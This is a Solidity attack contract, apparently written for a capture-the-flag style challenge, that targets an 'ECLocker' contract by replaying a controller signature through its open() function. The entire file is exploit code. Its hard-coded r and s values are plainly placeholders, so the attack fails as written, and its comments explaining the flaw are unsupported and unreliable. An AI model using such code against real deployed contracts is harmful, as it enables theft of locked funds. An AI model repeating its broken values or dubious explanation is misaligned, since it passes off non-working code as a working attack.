// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function open(uint8 v, bytes32 r, bytes32 s) external;

    function controller() external view returns (address);

    function msgHash() external view returns (bytes32);
}

contract ECLockerExploit {
    // Целевой контракт, который мы будем атаковать
    IECLocker public target;

    constructor(address _target) {
        target = IECLocker(_target);
    }

    function exploit() external {
        // Получаем msgHash из контракта
        bytes32 msgHash = target.msgHash();
        address controllerAddr = target.controller();

        // Подобранные значения r, s, v, которые при восстановлении через ecrecover
        // дадут адрес контроллера
        // Эти значения нужно будет подобрать заранее off-chain
        bytes32 r = bytes32(
            0x1234567890123456789012345678901234567890123456789012345678901234
        );
        bytes32 s = bytes32(
            0x5678901234567890123456789012345678901234567890123456789012345678
        );
        uint8 v = 27; // Валидное значение для v (27 или 28)

        // Проверяем, что выбранные нами значения действительно восстанавливают адрес контроллера
        address recovered = ecrecover(msgHash, v, r, s);
        require(
            recovered == controllerAddr,
            "Signature values do not recover controller address"
        );

        // Вызываем open с нашими значениями r, s, v
        target.open(v, r, s);

        // Из-за уязвимости в _isValidSignature, мы можем повторно использовать ту же подпись
        // даже если она уже была использована, потому что signatureHash вычисляется неправильно

        // Повторно вызываем open с теми же параметрами
        // В нормальном контракте это должно вызвать ошибку SignatureAlreadyUsed
        // Но из-за уязвимости - сработает
        target.open(v, r, s);
    }

    // Вспомогательная функция для проверки, что выбранные значения r, s, v
    // восстанавливают нужный адрес контроллера
    function verifySignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public view returns (bool) {
        bytes32 msgHash = target.msgHash();
        address controllerAddr = target.controller();
        address recovered = ecrecover(msgHash, v, r, s);
        return recovered == controllerAddr;
    }
}
